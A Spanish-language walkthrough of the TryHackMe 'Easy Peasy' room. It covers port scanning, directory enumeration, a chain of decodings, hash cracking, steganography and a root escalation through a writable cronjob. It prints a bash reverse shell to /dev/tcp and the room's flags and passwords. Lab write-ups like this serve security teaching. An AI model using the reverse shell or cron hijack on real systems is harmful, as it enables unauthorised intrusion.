---
title: "TryHackMe: Easy Peasy"
category: "TryHackMe"
order: 25
tags: ["tryhackme", "steganography", "base62", "john-the-ripper", "cron", "encoding"]
layout: layouts/writeup.njk
permalink: /writeups/thm-easy-peasy.html
---

## Reconocimiento

```bash
nmap -Pn -n -v 10.10.1.97 -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
65524/tcp open  http    Apache httpd 2.4.43 (Ubuntu)
```

3 puertos abiertos. Nginx `1.16.1`. El puerto más alto corre **Apache**.

## Flag 1 — directorio oculto

```bash
gobuster dir -u http://10.10.1.97 -w /usr/share/wordlists/dirb/common.txt
...
/hidden               (Status: 301) [--> http://10.10.1.97/hidden/]
```

Dentro de `/hidden/` no hay nada visible a simple vista, pero un segundo `gobuster` sobre esa ruta revela otro subdirectorio (`/whatever/`). El código fuente de esa página contiene un string codificado en Base64, decodificado con CyberChef:

**Flag 1:** `flag{f1rs7_fl4g}`

## Flag 2 — hash MD5 revertido

Continuando la enumeración con extensiones (`php,html,txt,py,json`) no aparece nada nuevo en `/hidden/whatever/`, pero revisando el `robots.txt` del sitio aparece un hash. `hash-identifier` lo identifica como **MD5**, y se revierte con un servicio de lookup en línea:

**Flag 2:** `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

## Flag 3 — directorio codificado en Base62 + hash cracked con John

El código fuente del sitio en el puerto 65524 contiene otro string, esta vez codificado en **Base62**, que al decodificar revela un directorio oculto: `/n0th1ng3ls3m4tt3r`.

Dentro de ese directorio hay un hash. Con el diccionario provisto por la room y John the Ripper:

```bash
john --wordlist=dictionary.txt --format=GOST hash.txt
...
mypasswordforthatjob (?)
```

**Contraseña:** `mypasswordforthatjob`

## Flag 4 — esteganografía + binario

En la misma ruta hay una imagen (`binarycodepixabay.jpg`). Usando la contraseña anterior como passphrase de esteganografía:

```bash
steghide info binarycodepixabay.jpg
steghide --extract -sf binarycodepixabay.jpg
cat secrettext.txt

username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

La cadena binaria decodifica a: **`iconvertedmypasswordtobinary`**

## Flag 5 — user.txt vía SSH (puerto no estándar)

```bash
ssh boring@10.10.188.120 -p6498
```

> Nota: el intento inicial en el puerto 22 estándar falló — el nmap ya había mostrado que SSH corría en el puerto **6498**, no el estándar.

```bash
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

El texto está cifrado con ROT (decodificado con dcode.fr):

**Flag:** `flag{n0wits33msn0rm4l}`

## Flag 6 — root vía cronjob inseguro

```bash
cat /etc/crontab
...
* * * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

Un script ejecutado por root cada minuto es escribible por el usuario actual. Se sobrescribe con una reverse shell:

```bash
bash -i >& /dev/tcp/<tun0_ip>/9696 0>&1
```

```bash
root@kral4-PC:~# cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```

## Lecciones aprendidas

- Esta room es una excelente muestra de "cadena de encoding": Base64 → MD5 → Base62 → binario → ROT, cada capa apuntando a la siguiente pista. Vale la pena tener CyberChef siempre a mano para identificar encodings desconocidos por patrón.
- Nunca asumir el puerto estándar de un servicio — siempre volver al output de `nmap` cuando una conexión falla inesperadamente.
- Un cronjob root que ejecuta un script escribible por un usuario sin privilegios es una escalada trivial e inmediata a root — es uno de los primeros vectores a revisar (`cat /etc/crontab`, permisos de scripts referenciados) en cualquier máquina Linux comprometida.
